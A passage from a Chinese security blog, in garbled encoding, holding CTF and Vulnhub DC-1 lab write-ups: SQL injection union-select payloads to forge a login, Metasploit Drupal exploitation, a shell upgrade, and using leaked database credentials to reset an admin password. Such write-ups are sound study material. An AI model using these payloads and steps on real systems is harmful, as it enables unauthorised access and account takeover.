<p>å½“ç„¶çœ‹ä¸å‡ºæ¥ï¼Œç›´æ¥æ— è„‘<code>ciphey</code>ï¼Œä¹Ÿå¯ä»¥ï¼Œå½“ç„¶è¿˜æ˜¯éœ€è¦äº†è§£ä¸åŒç¼–ç å’ŒåŠ å¯†å­—ç¬¦çš„ç‰¹ç‚¹</p>
<p><img src="/post/wp-buuctf/image-20220909204746167.png" alt="image-20220909204746167"></p>
<p>ä¹Ÿå¯ä»¥å¾—åˆ°è§£ç ç»“æœ</p>
<hr>
<p>ç”±</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>

<p>å¯çŸ¥ï¼Œsqlæ³¨å…¥ç‚¹åœ¨Usernameå¤„ï¼Œä¸”ä¸ºå•å¼•å·é—­åˆ</p>
<p>äºæ˜¯æˆ‘ä»¬å°æ„é€ æ³¨å…¥</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>and%<span class="number">201</span>=<span class="number">1</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220909205630033.png" alt="image-20220909205630033"></p>
<p>å‘ç°æœ‰çš„å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fuzzçˆ†ç ´æµ‹è¯•çœ‹çœ‹ï¼Œä¹Ÿå¯ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•</p>
<p>æˆ‘è¿™é‡Œå…ˆçˆ†ç ´è¯•è¯•ï¼ˆå»ºè®®çˆ†ç ´è¿˜æ˜¯æ…¢ä¸€äº›ï¼Œåé¢ç›´æ¥å¤ªå¤šè¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸å‘è¿”å›åŒ…äº†ï¼‰</p>
<p>å¤§æ¦‚ç»Ÿè®¡ä¸€ä¸‹</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">or</span><br><span class="line">()</span><br><span class="line"><span class="operator">=</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰å…ˆè¯•è¯•è”åˆæ³¨å…¥</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">ç”±äºè¿‡æ»¤äº†or</span><br><span class="line">æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨<span class="keyword">order</span> <span class="keyword">by</span>æ¥åˆ¤æ–­åˆ—æ•°ï¼Œå¯ä»¥ç”¨è”åˆæ³¨å…¥ï¼Œåˆ©ç”¨<span class="keyword">select</span>çš„ç»“æœæ¥åˆ¤æ–­</span><br></pre></td></tr></table></figure>

<p>å…ˆè¯•è¯•<code>select 1,2</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220909214254664.png" alt="image-20220909214254664"></p>
<p>å‘ç°æŠ¥é”™ï¼Œåˆ—æ•°æœ‰é—®é¢˜</p>
<p>å†è¯•è¯•<code>select 1,2,3</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220909214345515.png" alt="image-20220909214345515"></p>
<p>å‘ç°è™½ç„¶æ²¡æœ‰æŠ¥é”™ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰ç›´æ¥å›æ˜¾</p>
<p>å†è¯•è¯•<code>select 1,2,3,4</code></p>
<p>åˆæŠ¥é”™</p>
<p><img src="/post/wp-buuctf/image-20220909214506605.png" alt="image-20220909214506605"></p>
<p><strong>æ‰€ä»¥å¾—å‡º<code>åˆ—æ•°ä¸€å…±æœ‰3åˆ—</code></strong></p>
<p><strong>æ ¹æ®ç»éªŒè¿™ä¸‰åˆ—ï¼Œåˆ†åˆ«æ˜¯</strong><u><strong>id,username,password</strong></u></p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥è¿›è¡Œç¡®è®¤</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="built_in">select</span>%<span class="number">20</span>â€adminâ€œ,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;pw=123456   </span></span><br><span class="line"><span class="comment">//æŠŠç¬¬ä¸€ä½ï¼Œå³1çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220910085003536.png" alt="image-20220910085003536"></p>
<p>æç¤ºç”¨æˆ·åé”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åä¸åœ¨ç¬¬ä¸€ä½</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="number">-1</span>&#x27;<span class="variable">%20</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="number">3</span>#&amp;pw<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">//æŠŠç¬¬äºŒä½ï¼Œå³<span class="number">2</span>çš„ä½ç½®æ¢æˆç”¨æˆ·åadmin</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220910085115686.png" alt="image-20220910085115686"></p>
<p>æç¤ºå¯†ç é”™è¯¯ï¼Œçœ‹æ¥ç”¨æˆ·åå›æ˜¾å°±åœ¨ç¬¬äºŒä½</p>
<p><strong>ä½†æ˜¯æ²¡æœ‰å›æ˜¾æˆ‘ä»¬selectçš„æ•°æ®ï¼Œå¯æ˜¯å¦‚æœç”¨æŠ¥é”™æ³¨å…¥å’Œç›²æ³¨çš„è¯ï¼Œ()è¢«è¿‡æ»¤äº†ï¼Œä¹Ÿä¸èƒ½ç”¨</strong></p>
<p>æ‰€ä»¥æˆ‘ä»¬åªæœ‰è€ƒè™‘ï¼Œæ€ä¹ˆæ‰å¯ä»¥ç™»å½•ä¸Šå»</p>
<p>é¦–å…ˆè¿™æ˜¯ä¸€ä¸ªsqlæ³¨å…¥çš„é¢˜ç›®ï¼Œå¯†ç ä¸å¯èƒ½ç®€å•çš„çˆ†ç ´å°±å¯ä»¥è§£å†³</p>
<p><strong>å¯†ç è‚¯å®šæ˜¯è¿›è¡ŒåŠ å¯†ï¼Œæœ€å¸¸è§çš„å¯†ç åŠ å¯†å°±æ˜¯md5</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨<code>md()</code>å‡½æ•°æŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œå†åŠ ä¸Šæˆ‘ä»¬çš„ç”¨æˆ·åä¸€èµ·å¯¼å…¥åˆ°é¢˜ç›®çš„æ•°æ®åº“é‡Œï¼Œå³å¯å®Œæˆç™»å½•</p>
<p>æ³¨æ„å› ä¸º<code>()</code>è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥åªèƒ½å…ˆæŠŠå¯†ç è¿›è¡Œmd5åŠ å¯†ï¼Œåœ¨å¯¼å…¥ï¼Œè€Œä¸èƒ½ç›´æ¥ç”¨å‡½æ•°</p>
<hr>
<p>è¿™é‡Œåˆæœ‰ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹</p>
<p><strong>åœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚ã€union selectã€‘</strong></p>
<p>åœ¨<code>Web-study</code>é‡Œå†™çš„è¯¦ç»†</p>
<p>ä¸‹é¢ç®€å•è¯´ä¸€ä¸‹æµç¨‹</p>
<p>å…ˆæŠŠæˆ‘ä»¬çš„å¯†ç 123456åˆ©ç”¨md5åŠ å¯†</p>
<p><img src="/post/wp-buuctf/image-20220910090640990.png" alt="image-20220910090640990"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ„é€ payload</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">201</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class="number">123456</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">è”åˆæ³¨å…¥çš„æŠ€å·§ï¼Œå°±æ˜¯åœ¨ä½¿ç”¨<span class="built_in">union</span> <span class="keyword">select</span>æ—¶å€™ï¼Œåé¢çš„æ•°æ®å¦‚æœä¸å­˜åœ¨ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</span><br><span class="line">å¦‚ä¸Šé¢çš„</span><br><span class="line"></span><br><span class="line">æ ¹æ®ä¸Šé¢baseç¼–ç ç»“æœï¼Œ<span class="keyword">select</span> * <span class="keyword">from</span> user <span class="built_in">where</span> username = &#x27;$name&#x27;</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬åˆ©ç”¨<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span></span><br><span class="line"></span><br><span class="line">å› ä¸ºuserè¡¨é‡Œä¸å­˜åœ¨id=<span class="number">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¼šç”Ÿæˆä¸€ä¸ªä¸€ä¸ªæ•°æ®æ’å…¥è¡¨ä¸­</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">å½“nameå‚æ•°è¿›è¡Œsqlæ³¨å…¥ï¼ŒæŠŠæ•°æ®æ’å…¥userè¡¨ä¸­æ—¶</span><br><span class="line">åé¢passwordåªè¦å’Œæ˜æ–‡ä¸€æ ·ï¼Œå³å¯ç™»å½•æˆåŠŸ</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220910091405613.png" alt="image-20220910091405613"></p>
<p>å¾—åˆ°flag</p>
<h2 id="13-æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#13-æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="13.[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>13.[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><h3 id="1-é¢˜ç›®æè¿°-10"><a href="#1-é¢˜ç›®æè¿°-10" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhubé¶åœºå­¦ä¹ ç¬”è®°</title>
    <url>//post/vulnhub/</url>
    <content><![CDATA[<p><u><code>å­¦ä¹ ä¸€ä¸‹å®æˆ˜é¶åœºï¼Œåšä¸€ä¸‹ç¬”è®°</code></u></p>
<p><code>å®æˆ˜ç¯å¢ƒï¼Œ</code></p>
<p><code>ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›å†³å®šäº†èƒ½å¦æ¸—é€æˆåŠŸï¼Œä»¥åŠè‡ªå·±ä¼šæµªè´¹è‡ªå·±å¤šå°‘æ—¶é—´</code></p>
<span id="more"></span>

<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å®˜ç½‘ä¸‹è½½åœ°å€</p>
<blockquote>
<p><a href="http://www.vulnhub.com/">http://www.vulnhub.com/</a></p>
</blockquote>
<p>è¿™é‡Œæä¸€ä¸‹é¶åœºæœº<code>ip</code>æ€ä¹ˆçœ‹</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></p>
<blockquote>
<p><code>nmap -sP  192.168.133.134/24</code><br>&#x2F;&#x2F;192.168.133.134æ˜¯è™šæ‹Ÿæœºip</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></p>
<p>æ‰¾åˆ°é¶æœº<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>ä¹ æƒ¯æ€§ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹å®ƒç«¯å£</p>
<p><img src="/post/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></p>
<hr>
<h1 id="DCç³»åˆ—ã€1-9ã€‘-å®Œ"><a href="#DCç³»åˆ—ã€1-9ã€‘-å®Œ" class="headerlink" title="DCç³»åˆ—ã€1~9ã€‘(å®Œ)"></a>DCç³»åˆ—ã€1~9ã€‘(å®Œ)</h1><h1 id="ä¸€ã€DC-1-åˆçº§"><a href="#ä¸€ã€DC-1-åˆçº§" class="headerlink" title="ä¸€ã€DC-1[åˆçº§]"></a>ä¸€ã€DC-1[åˆçº§]</h1><p><strong>five flags</strong></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æµè§ˆå™¨è®¿é—®é¶æœº<code>ip</code></p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯å¼€å§‹ç•Œé¢</p>
<p><img src="/post/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></p>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸ªæ’ä»¶<code>Wappalyzer</code>ï¼Œå®ƒèƒ½å¤Ÿè·å–ç½‘é¡µè‡ªèº«çš„æ¡†æ¶å’Œç¼–å†™çš„è¯­è¨€ï¼Œè¿™æ ·å°±ä¸ç”¨æŸ¥çœ‹ç½‘ç»œè¿”å›åŒ…æ¥åˆ†æäº†</p>
<p><img src="/post/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></p>
<p>å¯ä»¥çœ‹åˆ°ç½‘ç«™æ˜¯ç”¨<code>php</code>è¯­è¨€ç¼–å†™çš„ï¼Œ<code>CMS</code>æ˜¯<code>Drupal</code></p>
<hr>
<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>å…ˆç”¨<code>msf</code>çœ‹çœ‹æœ‰æ²¡æœ‰<code>drupal</code>ç›¸åº”çš„æ”»å‡»è„šæœ¬</p>
<blockquote>
<p>ç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥<code>msf</code>ç•Œé¢ï¼Œæˆ–è€…èœå•ä¹Ÿå¯ä»¥æ‰“å¼€</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></p>
<blockquote>
<p>è¾“å…¥<code>search drupal</code>ï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰drupalå¯ä»¥åˆ©ç”¨çš„è„šæœ¬<br><em>å¯¹äºå…¶ä»–å‘½ä»¤ï¼Œå¯ä»¥ç”¨helpæŸ¥è¯¢</em></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>è¿™é‡Œå¯ä»¥é€‰æ‹©ä¸åŒçš„è„šæœ¬ï¼Œä¸‹é¢ä»¥ç¼–å·1çš„è„šæœ¬ä¸ºä¾‹ï¼Œå…¶ä»–çš„åº”è¯¥ä¹Ÿå¯ä»¥</p>
<blockquote>
<p>è¾“å…¥<code>use 1</code>ï¼Œè¿›å…¥ç¼–å·1è„šæœ¬çš„è¿è¡Œç¯å¢ƒ</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></p>
<blockquote>
<p>è¾“å…¥<code>show options</code>,æŸ¥çœ‹è„šæœ¬è¿è¡Œçš„æ‰€éœ€è¦é…ç½®çš„é¡¹ç›®</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></p>
<blockquote>
<p><code>Required</code>æ˜¯è¦æ±‚å¡«çš„ï¼Œ<code>yes</code>æ˜¯å¿…å¡«é¡¹ï¼Œ<code>no</code>æ˜¯éå¿…å¡«é¡¹</p>
</blockquote>
<p>è¿™é‡Œçš„<code>RHOSTS</code>æ²¡æœ‰å¡«ï¼Œè¿™é‡Œæ˜¯è¦æ±‚å¡«å…¥<code>target hosts</code>ä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é¶æœºçš„åœ°å€</p>
<blockquote>
<p>è¾“å…¥<code>set RHOSTS 192.168.133.136</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></p>
<blockquote>
<p>å†è¾“å…¥<code>run</code>ï¼Œè¿è¡Œè„šæœ¬</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></p>
<blockquote>
<p>è¾“å…¥<code>shell</code>ï¼Œè¿›å…¥<code>shell</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></p>
<blockquote>
<p>è¾“å…¥<code>whoami</code>ï¼ŒæŸ¥çœ‹å½“å‰çš„æƒé™</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>å‘ç°æ˜¯ä¸ªä½æƒé™çš„è´¦å·</p>
<blockquote>
<p>è¾“å…¥<code>ls</code>ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å½“å‰çš„ç›®å½•æ–‡ä»¶</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>ä½†æ˜¯ä¸€å †ä¸œè¥¿æŒ¤åœ¨ä¸€èµ·ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å¤ªæ–¹ä¾¿</p>
<h3 id="äº¤äº’å¼shell"><a href="#äº¤äº’å¼shell" class="headerlink" title="*äº¤äº’å¼shell"></a><code>*äº¤äº’å¼shell</code></h3><p><strong>è¾“å…¥ä¸‹æ–¹æŒ‡ä»¤ï¼Œåˆ©ç”¨pythonè¿›å…¥äº¤äº’å¼shellã€å›ºå®šå§¿åŠ¿ï¼Œè¦è®°ä½ã€‘</strong></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></p>
<blockquote>
<p>è¾“å…¥<code>ls</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>å‘ç°<code>flag1.txt</code></p>
<blockquote>
<p>è¾“å…¥<code>cat flag1.txt</code>æŸ¥çœ‹</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830142915555.png" alt="image-20220830142915555"></p>
<blockquote>
<p><code>Every good CMS needs a config file - and so do you.</code><br>æ„æ€æ˜¯ï¼šä¸€ä¸ªå¥½çš„CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰éœ€è¦ä¸€ä¸ªconfig fileï¼ˆé…ç½®æ–‡ä»¶ï¼‰</p>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çœ‹çœ‹å®ƒçš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ˜¯Flag2çš„çº¿ç´¢</p>
</blockquote>
<h2 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h2><p>åœ¨ç›®å½•ä¸‹æˆ‘ä»¬å‘ç°æœ‰ä¸ª<code>sites</code>ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ç«™ç‚¹ç›®å½•ï¼Œé‡Œé¢å¾ˆæœ‰å¯èƒ½æœ‰é…ç½®æ–‡ä»¶</p>
<p><img src="/post/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<blockquote>
<p>è¾“å…¥<code>cd sites;ls -a</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830143404972.png" alt="image-20220830143404972"></p>
<p>æœ‰ä¸ª<code>default</code>ï¼ˆé»˜è®¤ï¼‰ç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p>
<blockquote>
<p>è¾“å…¥<code>cd default;ls -a</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830143517235.png" alt="image-20220830143517235"></p>
<p>çœ‹åˆ°<code>setting.php</code>ä¹Ÿå°±å·®ä¸å¤šæ˜¯<code>config file</code></p>
<blockquote>
<p>è¾“å…¥<code>cat setting.php</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830143752469.png" alt="image-20220830143752469"></p>
<p>å¾—åˆ°<code>Flag2</code></p>
<blockquote>
<ul>
<li><p><code>flag2</code></p>
</li>
<li><p><code>Brute force and dictionary attacks aren&#39;t the</code></p>
</li>
<li><p><code>only ways to gain access (and you WILL need access).</code></p>
</li>
<li><p><code>What can you do with these credentials?</code></p>
<p> æ„æ€æ˜¯ï¼šæš´åŠ›å’Œå­—å…¸æ”»å‡»ä¸æ˜¯è·å¾—è®¿é—®æƒé™çš„å”¯ä¸€æ–¹æ³•ï¼ˆæ‚¨å°†éœ€è¦è®¿é—®æƒé™ï¼‰ã€‚<br> ä½ èƒ½ç”¨è¿™äº›è¯ä¹¦åšä»€ä¹ˆï¼Ÿ</p>
</li>
</ul>
<p>å°±æ˜¯è¯´ä¸è¦å±€é™äºçˆ†ç ´å¯†ç æ¥ç™»å½•adminç”¨æˆ·ï¼Œä½ æ‹¥æœ‰äº†æ•°æ®åº“è¿™äº›ä¿¡æ¯ï¼Œä½ å¯ä»¥åšä»€ä¹ˆ</p>
</blockquote>
<hr>
<h2 id="Flag3"><a href="#Flag3" class="headerlink" title="Flag3"></a>Flag3</h2><p>å…³é”®åˆ†æè¿™é‡Œï¼Œè¿™æ˜¯é¶æœºæ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç çš„ä¿¡æ¯ï¼Œ</p>
<p>æœ‰äº†è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è¿›å…¥é¶æœºçš„æ•°æ®åº“ï¼Œå¯¹é‡Œé¢çš„æ•°æ®åº“è¿›è¡Œä¿®æ”¹æˆ–å¢æ·»</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> (</span><br><span class="line">     <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   )</span><br></pre></td></tr></table></figure>

<h3 id="1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰"><a href="#1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰" class="headerlink" title="1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰"></a>1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰</h3><blockquote>
<p>è¾“å…¥<code>mysql -udbuser -pR0ck3t</code></p>
<p>*æ³¨æ„è¿™é‡Œ-uå’Œ-påé¢æ²¡æœ‰ç©ºæ ¼ï¼Œæœ‰ç©ºæ ¼ä¼šæŠ¥é”™</p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830151236620.png" alt="image-20220830151236620"></p>
<p>å…ˆçœ‹çœ‹æ•°æ®åº“</p>
<blockquote>
<p>è¾“å…¥<code>show databases;</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830151531028.png" alt="image-20220830151531028"></p>
<p>æŸ¥çœ‹<code>drupaldb</code>åº“é‡Œçš„è¡¨</p>
<blockquote>
<p>è¾“å…¥<code>use drupaldb;</code><br>ç„¶åè¾“å…¥<code>show tables;</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830151716900.png" alt="image-20220830151716900"></p>
<p>çœ‹åˆ°<code>users</code>è¡¨ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ç™»å½•æˆåŠŸçš„å…³é”®ï¼ŒæŸ¥çœ‹è¯¥è¡¨</p>
<p><img src="/post/vulnhub/image-20220830151829478.png" alt="image-20220830151829478"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä¿®æ”¹æˆ–è€…è·å¾—adminç”¨æˆ·çš„å¯†ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥å†åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯éƒ½éœ€è¦åŠ å¯†</p>
<blockquote>
<p>å› ä¸ºè¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°ç”¨æˆ·çš„å¯†ç æ˜¯è¢«åŠ å¯†äº†çš„ï¼Œé‚£åŠ å¯†æ–‡ä»¶è‚¯å®šæ˜¯åœ¨è„šæœ¬ç›®å½•é‡Œï¼Œä¹Ÿå°±æ˜¯scriptsç›®å½•é‡Œï¼Œåˆ©ç”¨åŠ å¯†è„šæœ¬ï¼ŒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†ï¼Œç„¶åæ›´æ–°æ•°æ®åº“é‡Œadminç”¨æˆ·åŸæœ¬çš„å¯†ç </p>
</blockquote>
<p>æˆ‘ä»¬æ¥æ‰¾æ‰¾å¯†ç åŠ å¯†è„šæœ¬åœ¨å“ªé‡Œ</p>
<p><img src="/post/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>çœ‹åˆ°<code>scripts</code>ç›®å½•</p>
<p>è¿›å…¥æŸ¥çœ‹</p>
<blockquote>
<p>è¾“å…¥<code>cd scripts;ls -a</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20220830152428416.png" alt="image-20220830152428416"></p>
<p>å‘ç°æœ‰ä¸€ä¸ª<code>password-hash.sh</code>æ–‡ä»¶ï¼Œå¯†ç å°±æ˜¯é€šè¿‡å®ƒè¿›è¡ŒhashåŠ å¯†çš„</p>
<p>è¿è¡Œå®ƒï¼Œè®©å®ƒæŠŠæˆ‘ä»¬çš„å¯†ç åŠ å¯†</p>
<blockquote>
<p>è¾“å…¥<code>./password-hash.sh  123456</code></p>
</blockquote>
<hr>
<p>ä½†æ˜¯è¿è¡Œå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼Œå¦‚æœæ²¡æœ‰è¯·å¿½ç•¥</p>
<p><img src="/post/vulnhub/image-20220830152851541.png" alt="image-20220830152851541"></p>
<p>æŠ¥é”™è¯´</p>
<blockquote>
<p><code>include_once(/var/www/scripts/includes/password.inc): failed to open stream: No such file or directory</code> </p>
</blockquote>
